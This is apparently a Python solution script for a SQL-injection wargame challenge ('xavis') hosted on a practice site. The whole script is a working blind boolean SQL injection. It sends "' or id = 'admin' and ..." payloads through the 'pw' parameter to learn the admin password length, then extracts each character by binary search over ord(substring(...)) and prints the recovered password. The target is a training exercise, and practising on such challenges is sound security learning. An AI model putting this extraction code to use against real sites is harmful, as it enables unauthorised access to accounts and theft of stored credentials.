import requests

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
cookie = {'PHPSESSID': 'cookie'}

def find_length():
    pwlength = 1

    while True:
        param = {"pw": "' or id = 'admin' and length(pw) = {} #".format(pwlength)}
        req = requests.get(url, params = param, cookies = cookie)
        if "Hello admin" in req.text:
            return pwlength
        else:
            pwlength += 1

def find_pw():
    length = find_length()
    print("길이", length)
    password = ""
    for i in range(length):
        s = 0
        e = 60000
        value = 30000
        while True:
            param = {"pw": "' or id = 'admin' and ord(substring(pw, {}, 1)) = {} #".format(i+1, value)}
            print(param)
            req = requests.get(url, params = param, cookies = cookie)
            if "Hello admin" in req.text:
                password += chr(value)
                break
            else:
                param = {"pw": "' or id = 'admin' and ord(substring(pw, {}, 1)) > {} #".format(i+1, value)}
                req = requests.get(url, params = param, cookies = cookie)
                if "Hello admin" in req.text:
                    s = value
                    value = (value + e) // 2
                else:
                    e = value
                    value = (s + value) // 2
    print("비밀번호는: ", password)

find_pw()